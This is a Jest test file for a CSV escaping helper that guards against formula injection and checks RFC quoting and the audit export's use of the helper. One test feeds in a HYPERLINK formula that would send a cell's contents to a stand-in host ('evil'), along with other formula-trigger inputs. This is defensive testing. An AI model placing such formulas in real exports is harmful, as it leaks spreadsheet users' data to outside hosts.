import * as fs from 'fs';
import * as path from 'path';
import { escapeCsvCell, toCsvRow } from './csv.util';

describe('CSV formula-injection neutralisation', () => {
  it.each(['=1+1', '+SUM(A1)', '-2+3', '@cmd', '\tx', '\rx'])('prefixes %j with a single quote', (v) => {
    const out = escapeCsvCell(v);
    expect(out.replace(/^"/, '').startsWith("'")).toBe(true);
  });

  it('neutralises a HYPERLINK exfiltration payload and still quotes it', () => {
    expect(escapeCsvCell('=HYPERLINK("http://evil/?"&A1,"x")')).toBe(
      `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`,
    );
  });

  it('leaves ordinary values untouched and RFC-quotes commas/newlines', () => {
    expect(escapeCsvCell('Product')).toBe('Product');
    expect(escapeCsvCell('a,b')).toBe('"a,b"');
    expect(escapeCsvCell('line1\nline2')).toBe('"line1\nline2"');
    expect(escapeCsvCell(null)).toBe('');
    expect(toCsvRow(['x', '=y', 3])).toBe("x,'=y,3");
  });

  it('audit export uses the shared util', () => {
    const src = fs.readFileSync(path.join(__dirname, 'audit.controller.ts'), 'utf8');
    expect(src).toMatch(/toCsvRow\(/);
    expect(src).not.toMatch(/function escapeCsv\(/);
  });
});
